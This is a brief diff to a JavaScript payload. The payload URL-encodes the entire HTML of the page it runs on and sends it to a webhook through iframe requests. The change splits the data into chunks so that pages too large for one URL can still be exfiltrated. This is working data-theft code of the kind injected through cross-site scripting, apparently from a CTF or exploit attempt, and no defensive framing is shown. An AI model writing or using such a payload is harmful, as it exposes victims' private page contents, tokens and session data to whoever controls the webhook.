@@ -21,10 +21,16 @@ async function run(a = 0, b = 1001) {
 
     const data = encodeURIComponent(document.documentElement.outerHTML);
     
-    const iframe = document.createElement("iframe");
-    iframe.src = WEBHOOK + "?data=" + data;
     
-    document.documentElement.appendChild(iframe);
+    for (let i = 0; i < data.length; i += chunkSize) {
+        const chunk = data.slice(i, i + chunkSize);
+    
+        const iframe = document.createElement("iframe");
+        iframe.src = WEBHOOK + "?i=" + i + "&d=" + encodeURIComponent(chunk) + "&r=" + Math.random();
+    
+        document.documentElement.appendChild(iframe);
+    }
+        
 }
 
 run();
